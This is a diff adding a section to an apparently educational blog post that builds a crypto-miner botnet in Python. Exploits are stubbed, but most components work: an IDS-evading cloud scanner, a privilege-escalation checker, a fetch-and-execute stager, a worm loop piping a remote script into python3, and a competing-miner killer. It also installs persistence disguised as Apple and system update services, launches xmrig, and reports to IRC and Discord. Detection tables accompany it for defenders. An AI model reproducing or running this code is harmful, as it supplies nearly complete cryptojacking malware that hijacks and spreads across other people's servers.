@@ -738,6 +738,599 @@ locations defenders check when investigating a compromised machine.
 
 ---
 
+## Part 3: A Real-World Scenario -- Crypto Miner Botnet
+
+Parts 1 and 2 covered the mechanics of a C2 in isolation. This section puts those
+mechanics into a realistic context: the crypto miner botnet, which is one of the most
+common botnet types seen in the wild today. The goal here is to understand how these
+operations actually work, what they look like on the wire, and what defenders look for.
+None of the code in this section contains working exploit payloads -- those steps are
+stubbed so the overall shape is clear without being a ready-to-run attack toolkit.
+
+### How it spreads
+
+A crypto miner botnet grows by scanning the public internet for servers running
+vulnerable or misconfigured services, exploiting them to get a shell, and then
+installing itself. The scanning isn't random -- bots target IP ranges published by
+cloud providers (AWS, DigitalOcean, Vultr, Hetzner all publish their CIDR ranges
+publicly) because cloud servers are always on, have good bandwidth, and are frequently
+spun up and forgotten with default configurations.
+
+The most commonly targeted ports and services are:
+
+| Port | Service | Why it's targeted |
+|------|---------|------------------|
+| 22 | SSH | Outdated daemons, weak/default credentials, or misconfigured key auth |
+| 2375 | Docker API (unauthenticated) | Exposes full container and host control with no auth by default |
+| 6379 | Redis (no-auth) | Default Redis has no password; allows arbitrary command execution via config writes |
+| 8888 | Jupyter Notebook | Frequently deployed without a password, gives a full code execution interface |
+| 80/443 | HTTP/S | Web apps running outdated software with known RCE vulnerabilities |
+
+Here's an extended version of the scanner from Part 2 that specifically targets those
+services:
+
+```python
+# spread_scan.py
+import ipaddress
+import socket
+import random
+
+# Ports worth checking for common misconfigurations
+TARGET_PORTS = [22, 80, 443, 2375, 6379, 8888]
+
+
+def scan_subnet(cidr, ports=None, timeout=0.5):
+    """Scan a CIDR range for hosts with open target ports.
+
+    Only use this on networks you own or have explicit permission to scan.
+    """
+    if ports is None:
+        ports = TARGET_PORTS
+
+    results = []
+    hosts = list(ipaddress.IPv4Network(cidr, strict=False).hosts())
+    random.shuffle(hosts)  # randomise order to avoid sequential scan signatures
+
+    for ip in hosts:
+        ip_str = str(ip)
+        open_ports = []
+        for port in ports:
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                    s.settimeout(timeout)
+                    s.connect((ip_str, port))
+                    open_ports.append(port)
+            except (socket.timeout, ConnectionRefusedError, OSError):
+                pass
+        if open_ports:
+            results.append((ip_str, open_ports))
+
+    return results
+
+
+def pick_random_cloud_subnet():
+    """Return a random /24 from a handful of well-known cloud provider ranges.
+
+    These ranges are publicly documented by each provider.
+    Using them here purely as examples of how bots pick targets.
+    """
+    cloud_cidrs = [
+        "3.0.0.0/8",      # AWS ap-southeast-1 (example)
+        "104.16.0.0/12",  # Cloudflare / common hosting
+        "167.99.0.0/16",  # DigitalOcean
+        "95.179.0.0/16",  # Vultr
+    ]
+    base = ipaddress.IPv4Network(random.choice(cloud_cidrs), strict=False)
+    # pick a random /24 within the larger block
+    subnets = list(base.subnets(new_prefix=24))
+    return str(random.choice(subnets))
+```
+
+The shuffle matters -- sequential scanning of a /24 is a trivial IDS signature.
+Randomising the order and spreading attempts over time makes it look more like
+background noise.
+
+### Initial access and privilege escalation
+
+Once the scanner returns a hit, the bot tries to turn an open port into a shell.
+The general flow for each service type is the same:
+
+1. Fingerprint the service (banner grab or a known probe request)
+2. Try the most common misconfiguration for that service
+3. If a foothold is established as a low-privilege user, check for priv-esc paths
+4. Report back to C2 with access details
+
+The code below stubs out each exploit path. The comments describe what a real
+implementation would do -- the intent is to make the technique legible to a defender
+without providing a working payload:
+
+```python
+# exploit.py
+
+class ExploitError(Exception):
+    pass
+
+
+def fingerprint(ip, port, timeout=3):
+    """Grab the service banner from an open port."""
+    try:
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            s.connect((ip, port))
+            s.send(b"\r\n")
+            return s.recv(1024).decode(errors="replace").strip()
+    except Exception:
+        return ""
+
+
+def exploit(ip, port):
+    """Attempt to gain shell access via a known misconfiguration.
+
+    Returns a shell command runner callable on success, raises ExploitError otherwise.
+    This is intentionally stubbed -- the comments describe the real technique.
+    """
+    banner = fingerprint(ip, port)
+
+    if port == 22:
+        # SSH -- try a short list of common default credentials via paramiko.
+        # Real variants also try CVE-based auth-bypass on older OpenSSH versions.
+        # If creds succeed: return a function that runs commands over the SSH channel.
+        raise NotImplementedError("SSH exploit stub -- paramiko credential spray")
+
+    elif port == 2375:
+        # Unauthenticated Docker API -- POST /containers/create with a bind-mount
+        # of the host filesystem, then exec into the container to read/write host files.
+        # Trivially achieves root-equivalent access on the host.
+        raise NotImplementedError("Docker API stub -- container escape via host bind-mount")
+
+    elif port == 6379:
+        # Redis with no auth -- use CONFIG SET dir/dbfilename to write an SSH authorized_keys
+        # file or a cron entry directly to disk, then trigger a BGSAVE.
+        # Gives arbitrary file write as the redis user, often root.
+        raise NotImplementedError("Redis stub -- config write to disk for persistence")
+
+    elif port == 8888:
+        # Jupyter without a password -- POST to /api/kernels to create a kernel,
+        # then send arbitrary Python code via the websocket execute channel.
+        # Immediate unauthenticated code execution as whatever user launched Jupyter.
+        raise NotImplementedError("Jupyter stub -- kernel execute via REST API")
+
+    elif port in (80, 443):
+        # HTTP -- check the banner/Server header for known vulnerable software versions,
+        # then apply a matching RCE payload (deserialization, SSTI, command injection, etc.).
+        raise NotImplementedError("HTTP stub -- version-matched RCE payload")
+
+    raise ExploitError(f"No exploit available for port {port}")
+
+
+def try_privesc(run_cmd):
+    """Given a low-priv shell runner, try common privilege escalation paths.
+
+    run_cmd is a callable that takes a shell command string and returns stdout.
+    Returns True if we achieved root, False otherwise.
+    """
+    checks = [
+        # SUID binaries that can be abused to get a root shell (see gtfobins.github.io)
+        "find / -perm -4000 -type f 2>/dev/null",
+        # World-writable cron scripts run as root
+        "find /etc/cron* /var/spool/cron -writable 2>/dev/null",
+        # Sudo rules that allow running something as root without a password
+        "sudo -n -l 2>/dev/null",
+    ]
+    for cmd in checks:
+        try:
+            output = run_cmd(cmd)
+            if output.strip():
+                # A real bot would parse the output and chain into a known
+                # gtfobins technique or overwrite the writable cron script.
+                return True
+        except Exception:
+            pass
+    return False
+```
+
+### Staged payload delivery
+
+Carrying the full miner binary inside the initial implant is wasteful and makes the
+implant easier to fingerprint. Real operations split this into two stages:
+
+- **Stage 1 (stager)** -- tiny script, sole job is to phone home to a staging server
+  and pull down the real payload, then execute it.
+- **Stage 2 (payload)** -- the full `miner_bot.py` served from a plain HTTP server.
+
+This also means the operator can update the payload on the staging server and all
+future infections automatically get the new version.
+
+```python
+# stager.py
+import os
+import stat
+import subprocess
+import tempfile
+import urllib.request
+
+STAGING_URL = "http://127.0.0.1:8000/miner_bot.py"
+
+
+def fetch_and_exec(url):
+    tmp = tempfile.mktemp(suffix=".py")
+    urllib.request.urlretrieve(url, tmp)
+    os.chmod(tmp, stat.S_IRWXU)
+    subprocess.Popen(["python3", tmp])
+
+
+if __name__ == "__main__":
+    fetch_and_exec(STAGING_URL)
+```
+
+The staging server for the local demo is just Python's built-in HTTP server:
+
+```bash
+# serve miner_bot.py from the current directory
+python3 -m http.server 8000
+```
+
+In a real operation the staging server is a separate VPS, often fronted by a CDN or
+legitimate-looking domain so the HTTP request blends in with normal traffic.
+
+### Killing competing miners
+
+Once the payload lands, the first thing it does before starting its own miner is kill
+any other mining processes. The goal is exclusivity -- a host running three miners
+splits its compute three ways, raises CPU alerts faster, and is more likely to get
+cleaned up.
+
+```python
+# miner_bot.py (excerpt)
+import os
+import signal
+import psutil
+
+KNOWN_MINER_NAMES = {
+    "xmrig", "xmrig-notls",
+    "minerd", "cpuminer",
+    "cgminer", "bfgminer",
+    "ethminer", "phoenix",
+    "nbminer", "teamredminer",
+    "t-rex", "gminer",
+}
+
+
+def kill_competing_miners(own_pid):
+    """Terminate any running processes that look like competing miners."""
+    for proc in psutil.process_iter(["pid", "name", "cmdline"]):
+        try:
+            name = (proc.info["name"] or "").lower()
+            cmdline = " ".join(proc.info["cmdline"] or []).lower()
+            if proc.info["pid"] == own_pid:
+                continue
+            if name in KNOWN_MINER_NAMES or any(m in cmdline for m in KNOWN_MINER_NAMES):
+                os.kill(proc.info["pid"], signal.SIGKILL)
+        except (psutil.NoSuchProcess, psutil.AccessDenied, ProcessLookupError):
+            pass
+```
+
+From a defender's perspective: if you notice a known miner process disappearing from
+`ps` output and a new unknown high-CPU process appearing shortly after, that's a
+strong indicator of a more sophisticated infection taking over.
+
+### Persistence
+
+The bot installs itself to survive reboots. A production variant tries all applicable
+methods and takes the first one that works:
+
+```python
+# miner_bot.py (excerpt)
+import os
+import platform
+import subprocess
+import sys
+import textwrap
+
+
+def install_persistence(script_path=None):
+    """Write persistence entries for the current platform.
+
+    script_path defaults to the currently running script.
+    Defender note: these are the exact locations to audit on a suspected host.
+    """
+    if script_path is None:
+        script_path = os.path.abspath(sys.argv[0])
+
+    system = platform.system()
+
+    if system == "Linux":
+        _persist_linux(script_path)
+    elif system == "Darwin":
+        _persist_macos(script_path)
+    elif system == "Windows":
+        _persist_windows(script_path)
+
+
+def _persist_linux(script_path):
+    # Method 1: user crontab -- survives as long as the user account exists
+    cron_line = f"@reboot python3 {script_path}\n"
+    try:
+        existing = subprocess.check_output(["crontab", "-l"],
+                                           stderr=subprocess.DEVNULL).decode()
+    except subprocess.CalledProcessError:
+        existing = ""
+    if script_path not in existing:
+        new_cron = existing + cron_line
+        proc = subprocess.Popen(["crontab", "-"],
+                                 stdin=subprocess.PIPE)
+        proc.communicate(new_cron.encode())
+
+    # Method 2: systemd user service -- more reliable, survives session logout
+    unit_dir = os.path.expanduser("~/.config/systemd/user")
+    os.makedirs(unit_dir, exist_ok=True)
+    unit_path = os.path.join(unit_dir, "sysupdate.service")
+    unit_content = textwrap.dedent(f"""\
+        [Unit]
+        Description=System Update Service
+
+        [Service]
+        ExecStart=python3 {script_path}
+        Restart=always
+        RestartSec=30
+
+        [Install]
+        WantedBy=default.target
+    """)
+    with open(unit_path, "w") as f:
+        f.write(unit_content)
+    subprocess.run(["systemctl", "--user", "enable", "--now", "sysupdate"],
+                   stderr=subprocess.DEVNULL)
+
+
+def _persist_macos(script_path):
+    # launchd plist in ~/Library/LaunchAgents/ -- loaded on login
+    plist_dir = os.path.expanduser("~/Library/LaunchAgents")
+    os.makedirs(plist_dir, exist_ok=True)
+    plist_path = os.path.join(plist_dir, "com.apple.sysupdate.plist")
+    plist_content = textwrap.dedent(f"""\
+        <?xml version="1.0" encoding="UTF-8"?>
+        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
+            "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
+        <plist version="1.0">
+        <dict>
+            <key>Label</key>
+            <string>com.apple.sysupdate</string>
+            <key>ProgramArguments</key>
+            <array>
+                <string>python3</string>
+                <string>{script_path}</string>
+            </array>
+            <key>RunAtLoad</key>
+            <true/>
+            <key>KeepAlive</key>
+            <true/>
+        </dict>
+        </plist>
+    """)
+    with open(plist_path, "w") as f:
+        f.write(plist_content)
+    subprocess.run(["launchctl", "load", plist_path], stderr=subprocess.DEVNULL)
+
+
+def _persist_windows(script_path):
+    # Registry Run key -- executed on every user login
+    import winreg
+    key = winreg.OpenKey(
+        winreg.HKEY_CURRENT_USER,
+        r"Software\Microsoft\Windows\CurrentVersion\Run",
+        0, winreg.KEY_SET_VALUE
+    )
+    winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ,
+                      f"python3 {script_path}")
+    winreg.CloseKey(key)
+```
+
+Detection checklist for each method:
+
+| Method | What to check |
+|--------|--------------|
+| Linux crontab | `crontab -l` for the affected user |
+| Linux systemd user unit | `systemctl --user list-units --all` |
+| macOS launchd | `launchctl list` and `~/Library/LaunchAgents/` |
+| Windows registry | `HKCU\Software\Microsoft\Windows\CurrentVersion\Run` in regedit |
+
+### Mining
+
+Once persistence is set and competing miners are dead, the bot launches `xmrig`
+pointing at a pool. The wallet address and pool are the only operator-specific
+config -- everything else is generic:
+
+```python
+# miner_bot.py (excerpt)
+import subprocess
+
+WALLET = "YOUR_WALLET_ADDRESS"
+POOL   = "pool.minexmr.com:4444"
+WORKER = "bot1"
+
+
+def start_miner():
+    """Launch xmrig in the background.
+
+    Assumes xmrig is on PATH. Real deployments fetch the binary from the
+    staging server alongside the bot script.
+    """
+    return subprocess.Popen(
+        [
+            "xmrig",
+            "--url",    POOL,
+            "--user",   f"{WALLET}.{WORKER}",
+            "--pass",   "x",
+            "--background",
+            "--no-color",
+        ],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+```
+
+The `WORKER` field (the part after the `.` in the username) is how the operator
+tracks which bot is contributing what hashrate on the pool dashboard. Each bot gets
+a unique worker name -- typically derived from the hostname or a random ID assigned
+at infection time.
+
+### Reporting via IRC (and Discord)
+
+The bot reports its status and hashrate back to the operator periodically. IRC is the
+traditional channel for this -- it requires no infrastructure beyond a public IRC
+server, the protocol is simple enough to implement with a raw socket, and IRC traffic
+on port 6667 used to blend in with legitimate traffic.
+
+```python
+# irc_report.py
+import socket
+import time
+
+
+IRC_HOST    = "irc.libera.chat"
+IRC_PORT    = 6667
+IRC_NICK    = "sysupd8"
+IRC_CHANNEL = "#status"
+
+
+def irc_connect():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((IRC_HOST, IRC_PORT))
+    s.settimeout(10)
+    s.send(f"NICK {IRC_NICK}\r\n".encode())
+    s.send(f"USER {IRC_NICK} 0 * :bot\r\n".encode())
+    # wait for MOTD / 001 welcome
+    time.sleep(3)
+    s.send(f"JOIN {IRC_CHANNEL}\r\n".encode())
+    return s
+
+
+def irc_report(message, conn=None):
+    """Post a message to the operator channel.
+
+    Opens a fresh connection each time to keep the bot stateless.
+    A real implementation would hold the connection open and handle PINGs.
+    """
+    close_after = conn is None
+    if conn is None:
+        conn = irc_connect()
+    conn.send(f"PRIVMSG {IRC_CHANNEL} :{message}\r\n".encode())
+    if close_after:
+        conn.close()
+```
+
+Discord webhooks have largely replaced IRC in newer operations -- they're three lines,
+require no infrastructure, and the traffic looks identical to normal Discord HTTPS:
+
+```python
+# discord_report.py (brief alternative)
+import requests
+
+WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"
+
+
+def discord_report(message):
+    requests.post(WEBHOOK_URL, json={"content": message})
+```
+
+The tradeoff is that Discord can (and does) terminate webhook URLs reported for abuse,
+so IRC gives the operator more control at the cost of slightly more setup.
+
+### Full scenario bot -- miner_bot.py
+
+Putting it all together: this is the full main loop that ties every component above
+into a single script. The exploit step is stubbed, but every other part is functional.
+
+```python
+# miner_bot.py
+import os
+import random
+import sys
+import time
+
+# -- imports from the modules above (collapsed here for readability) --
+# from spread_scan import scan_subnet, pick_random_cloud_subnet
+# from exploit    import exploit, try_privesc, ExploitError
+# from irc_report import irc_report
+
+
+BOT_ID       = os.urandom(4).hex()        # unique ID assigned at infection time
+SCAN_INTERVAL = 600                        # seconds between spread attempts
+REPORT_INTERVAL = 300                      # seconds between hashrate reports
+
+
+def main():
+    install_persistence()
+    kill_competing_miners(os.getpid())
+
+    miner = start_miner()
+    irc_report(f"[{BOT_ID}] online -- miner pid {miner.pid}")
+
+    last_scan   = 0
+    last_report = 0
+
+    while True:
+        now = time.time()
+
+        # periodic spread scan
+        if now - last_scan >= SCAN_INTERVAL:
+            subnet = pick_random_cloud_subnet()
+            hits = scan_subnet(subnet)
+            for ip, ports in hits:
+                for port in ports:
+                    try:
+                        run_cmd = exploit(ip, port)
+                        # if we got a shell, try to escalate and then install
+                        # the stager on the new host
+                        try_privesc(run_cmd)
+                        # fetch and execute stager on the remote host via run_cmd
+                        run_cmd(
+                            "curl -s http://127.0.0.1:8000/stager.py | python3"
+                        )
+                        irc_report(f"[{BOT_ID}] new bot: {ip}:{port}")
+                        break  # one successful exploit per host is enough
+                    except (NotImplementedError, Exception):
+                        pass
+            last_scan = now
+
+        # periodic hashrate report
+        if now - last_report >= REPORT_INTERVAL:
+            # xmrig exposes a JSON API on localhost:18088 when --http-enabled is set
+            # here we just report that we're alive; a real bot would parse the API
+            irc_report(f"[{BOT_ID}] alive -- uptime {int(now - last_report)}s")
+            last_report = now
+
+        time.sleep(10)
+
+
+if __name__ == "__main__":
+    main()
+```
+
+### Detection indicators
+
+From a defender's standpoint this is what to look for on a suspected host and on
+the network:
+
+| Indicator | Where to look |
+|-----------|--------------|
+| xmrig or unknown high-CPU process | `ps aux`, `top`, `htop` |
+| Outbound TCP to port 4444 (mining pool) | `ss -tnp`, firewall egress logs |
+| Outbound TCP to port 6667 (IRC) | `ss -tnp`, firewall egress logs |
+| Outbound HTTPS to `discord.com` from a server | Firewall egress logs, unusual for most servers |
+| New or unfamiliar cron entries | `crontab -l` for all users, `/etc/cron.d/` |
+| New systemd user units | `systemctl --user list-units --all` |
+| Unknown files in `~/Library/LaunchAgents/` | `ls -la ~/Library/LaunchAgents/` |
+| Mass outbound TCP SYNs to port 22, 2375, 6379 | Network flow logs, IDS alerts |
+| Processes named after system services with unusual parent PIDs | `ps auxf` (forest view) |
+| `/tmp` or `/dev/shm` executables | `ls -la /tmp /dev/shm` |
+
+The last two are particularly reliable: real system daemons don't spawn from a Python
+interpreter, and legitimate software doesn't execute binaries out of `/tmp`.
+
+---
+
 ## What's missing from this implementation (intentionally)
 
 This is a minimal educational demo. Real botnets add layers this post doesn't cover:
